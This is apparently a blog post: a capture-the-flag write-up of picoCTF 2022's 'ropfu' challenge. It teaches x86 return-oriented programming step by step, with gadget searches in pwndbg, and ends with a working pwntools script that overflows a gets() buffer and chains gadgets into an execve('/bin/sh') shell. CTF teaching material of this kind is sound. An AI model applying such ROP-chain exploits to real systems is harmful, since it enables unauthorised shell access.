---

title: "Ropfu"
date: 2023-09-22T00:39:08+08:00
author: John Wu
summary: "Intro to ROP and my writeup for picoCTF 2022's ropfu"
tags: ["CTFs", "pwn", "tech", "guides"]
ShowToc: true

---

This challenge is a simple return oriented challenge, which means I spent 2 days trying to solve the challenge and looking through the solutions for more than 2 hours.
Anyways, return oriented programming in x86.
Let's get started.

## Given

Problem:
What's ROP? Can you exploit the following program to get the flag? Download source. nc saturn.picoctf.net 54707

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

You are also given a `vuln` file with ASLR off.
```bash
~/CTF/picoCTF/ropfu > checksec vuln
[*] '/home/hyperboly/CTF/picoCTF/ropfu/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Hint: This is a classic ROP to get a shell

## What's ROP???
Return Oriented Programming (ROP), is just what the title says it is.
It's programming with return statements.

As a prerequisite, you should be familiar with how C/C++ return statements behave.
For example, for a function to break out of the function and go back to main, it needs some return value (with the exception of `void`).
I'm not great with C at all, but it's not hard to figure out.

Why do we need ROP though?
Up until now, I've only done challenges with a win() function, which obviously isn't realistic.
Which program nowadays would just have a function that gives the user the shell?
This is why ROP exists, to use existing code from the program against itself.
In this challenge, we want the shell.

Well let's find out how x86 deals with returns on the stack.
In x86, the stack frame right around the $esp would look like this:

| Position| What's in the Stack                    |
|---------|----------------------------------------|
| ebp-0x58 | $esp                                  |
| ebp-0x5c | possible args for func to return to   |
| ebp-0x60 | addr of return                        |
| ebp-0x64 | arbitrary data                        |

What's most important is noticing that the arguments are placed **on the stack**.
However, when arguments need to be used, it would be popped into a register (conventionally $eax takes arg[0], $ebx takes arg[1], and $ecx takes arg[2]).
Here's a [list](https://cs61.seas.harvard.edu/site/2018/Asm2/) of them.
This is different in x86-64, which conventionally stores arguments in general purpose registers.
So if the function already returned, how does the value even get placed placed onto the new stack frame?

The last instruction before the process `ret`s to the new stack frame would be a `pop` instruction.
What this does is pop the last 4 bytes off the stack BUT at the same time store the value into whatever register the pop instruction specified.
For example `pop eax` would take the last 4 bytes of the stack and store it into $eax.

To show the process of the execution, here's a step by step execution thing kind of:

1. Program to ret instruction
2. Stack value is an address that points to another function (return address)
3. Program gets to `pop eax` instruction
4. The top 4 bytes of the stack is deleted and copied onto $eax
5. Program goes into the new function's stack frame
6. Program returns to original stackframe and starts off where it left

So how do we program with ROP then?
All we need to do is set return address (and arguments if applicable) to ROP gadgets

### Gadgets? Is this sci-fi now?
Gadgets are essentially code snippets from the victim program that we can use against the program.
The gadgets you might want for the way I did this problem ends with the `ret` instruction, but you can also use a [nop chain, or a nop slide](https://en.wikipedia.org/wiki/NOP_slide) for this challenge.
In the case of a nop chain, you want to find something that has the `jmp` instruction.

## Assembling the ROP chain
Now that we understand gadgets, we can piece all these concepts together to create a ROP chain.
ROP chains are essentially carefully picked out gadgets strung together into the stack to do what we want it to do.
Since we want to call for the shell, we want a syscall to the shell.
Now, if there is a execve syscall gadget from the program, we can call that and pop the rest of the stack into `execve` as arguments!
To find syscall numbers, here's a [table](https://filippo.io/linux-syscall-table/).

## Analysis
Alright, now we have all the prerequisite knowledge to do this challenge.
To get started, read my [buffer overflow articles](/content/posts/guides/buffer-overflow-2.md) if you haven't already, or know how to do a simple buffer overflow.

So let's find the offset size of this program already.
Fire up GDB and do a cyclic of 100 because looking at the source code, the buffer can't be that big.
Next, just run the program and input the 100 de bruijns sequence string to find the offset.

```
pwndbg> cyclic 100                                                                                                                     
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa                                   
pwndbg> r                                                                                                                              
Starting program: /home/hyperboly/CTF/picoCTF/ropfu/vuln           
Downloading separate debug info for system-supplied DSO at 0xf7ffc000                                                                  
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!                                                                 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa                                   
                                                                                                                                       
Program received signal SIGSEGV, Segmentation fault.               
0x61616168 in ?? ()                                                                                                                    
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                  
────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────
*EAX  0xffffd310 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'             
*EBX  0x61616166 ('faaa')                                                                                                              
*ECX  0x80e5300 (_IO_2_1_stdin_) ◂— 0xfbad2288                                                                                         
*EDX  0xffffd374 ◂— 0x0          
*EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0                                                                                         
*ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0                     
*EBP  0x61616167 ('gaaa')                                          
*ESP  0xffffd330 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'                                             
*EIP  0x61616168 ('haaa')

pwndbg> cyclic -l haaa
Finding cyclic pattern of 4 bytes: b'haaa' (hex: 0x68616161)
Found at offset 28
```

From `cyclic -l haaa`, we can tell that the offset is 28.

Let's go back to the drawing board of the theory first, what do we do with this program to ROP around?
We first need somewhere to store the string '/bin/sh', which is too big for a register because we are in x86, but we also need someplace that we can access and know the static address for.
So, we are left with the gets() buffer.
You'll notice that $eax stores the address of the inputted string, which we can use to store our value.
> Why do we need to store /bin/sh? Don't we also need to store `execve()` and it's other arguments too?
Again, `execve()` is a syscall with a number attached to it.
The arguments we need to pass to it looks like this: `execve('/bin/sh',0,0)`, which means we only need to call the syscall number, provide the first argument, and xor the rest by itself to get 0.
Remember, arguments in x86 are just in the stack, which are then popped into registers.

So thats the first part of our payload.
Well we also know that we need the 28 byte padding for the buffer overflow to succeed, which means we need to add a padding of 20 bytes (/bin/sh+\x00 is 8 bytes).
So the only thing left in the stack is to put in the return address, thus creating our ROPchain.

Here's a summary of our payload (in the POV of the stack) so far:

| Value          | Description          |
|----------------|----------------------|
| 'A'*20         | 20 byte padding      |
| '/bin/sh\x00'  | '/bin/sh' in bytes   |

Now, we can use ROPgadgets (part of pwndbg) to find... gadgets.
The format for ROPgadgets in pwndbg is strange, to use arguments native to ROPgadgets, you must prepend the command with a `--`.
So, for example, you must use `rop -- --ropchain --string "Hello World"`.
However, pwndbg's ROPgadget includes a grep out of the box, so you don't need to go back to bash and use grep, you can just stay in GDB.

Well how do we find gadgets that would be useful?
First, we must plan out what kind of gadgets would be helpful to our problem.

1. Must push $eax and have $ebx popped at the same time
2. Must pop $eax and then have 0xb on the top of the stack
3. Must pop ecx or xor it by itself for a value of 0 (if popped, next value on stack must be a 0)
4. Must be a gadget called `int 0x80`, because that is the syscall for `execve()`

This are the gadgets we need in order, which is our payload.
In this payload, it ends with a return to the syscall before ending, which means the program would just run the shell and not exit.
Sometimes, you might want a call to `exit()`.
Please note that these gadgets sometimes do not exist perfectly in programs, so just find equivalent or similar gadgets if possible, otherwise take another approach.
Finally, save the addresses of these gadgets somewhere (in a script or file).

So let's look for these gadgets.
The simplest way to look for gadgets is to look for (by priority):
1. ends with ret
2. contains what you want before ret
3. contains what you want and ends with ret (requires general grep on the CLI)

Let's grep for gadgets that contains what I want before the ret first, which in this first case would end with $ebx getting popped
```
pwndbg> rop --grep "pop ebx ; ret"
...
0x08070fdd : push eax ; sbb al, 0xc6 ; inc eax ; and byte ptr [ecx], al ; pop ebx ; ret 
...
```
I actually got this by using tmux and searching for `push eax`, but you could also go into the CLI and just do `ROPgadget --binary vuln | grep 'push eax' | grep 'pop ebx ; ret'`.
Either ways, this gadget pushes $eax, which we want because it puts '/bin/sh' onto the top of the stack, and then does some random stuff that doesn't affect our ROPchain, and then goes into `pop ebx`, which we want to store the '/bin/sh' location since it's the second argument, and then returns.

For the next gadget, I need to find one that pops the $eax so I can fill it with `0xb`, in other words 11.
This is the number for the `execve()` syscall, which is why I need it in the $eax.
```
pwndbg> rop --grep "pop eax ; ret"
Saved corefile /tmp/tmp_2jarub7
0x080b0737 : add al, 0x8b ; inc eax ; pop eax ; ret
0x080b0739 : inc eax ; pop eax ; ret
0x080b073a : pop eax ; ret
```
Looking at the final one, it does exactly what I want it to do.

We'll now look for one that pops ecx, so we can put 0x0 in there.
```
pwndbg> rop --grep "pop ecx ; ret"
Saved corefile /tmp/tmpll3bgp0_
0xf7ffc576 : add eax, 0x5a5d80cd ; pop ecx ; ret
0xf7ffc579 : pop ebp ; pop edx ; pop ecx ; ret
0x08049e29 : pop ecx ; ret
0xf7ffc57a : pop edx ; pop ecx ; ret
```
And there you go, the 3rd one is just popping $ecx, very clean.

For the last gadget in the ROPchain, we'll look for the instruction `int 0x80`, as a call to return to syscall.
```
pwndbg> rop --grep "int 0x80"
...
0x0804a3c2 : int 0x80
...
```
We find the cleanest gadget at this address.
Now that we have all these gadgets, it's time to assemble them into a real payload.

## Solution
As a final checkpoint, I'm going to make the last chart describing what the top of the stack should look like after your input, which will also be the payload.

| Value in Stack    | Description             |
|-------------------|-------------------------|
| int 0x80          | needed as syscall       |
| 0x0               | arg for $ecx            |
| pop ecx           | gadget to null $ecx     |
| 0xb               | arg for $eax            |
| pop eax           | gadget to pop eax       |
| push eax; pop ebx | gadget for `execve`     |
| 'A'*20            | 20 byte padding         |
| '/bin/sh\x00'     | stored arg for `execve` |

Here is the final python script:

```py
#!/usr/bin/env python3

from pwn import *

p = process('./vuln')
#p = remote('saturn.picoctf.net', 54403)

# payload as `gets()` buffer
payload = b'/bin/sh\x00'    # saving /bin/sh onto gets buff

payload+= b'A'*20           # 20b buffer padding before ret addr

payload+= p32(0x08070fdd)   # push eax ; sbb al, 0xc6 ; inc eax ; and byte ptr [ecx], al ; pop ebx ; ret
payload+= p32(0x080b073a)   # pop eax
payload+= p32(0xb)
payload+= p32(0x08049e29)   # pop ecx
payload+= p32(0x0)

# ret addr to syscall, exit()
payload+= p32(0x804a3c2)    # int 0x80

p.sendlineafter(b'grasshopper!', payload)

p.interactive()
```
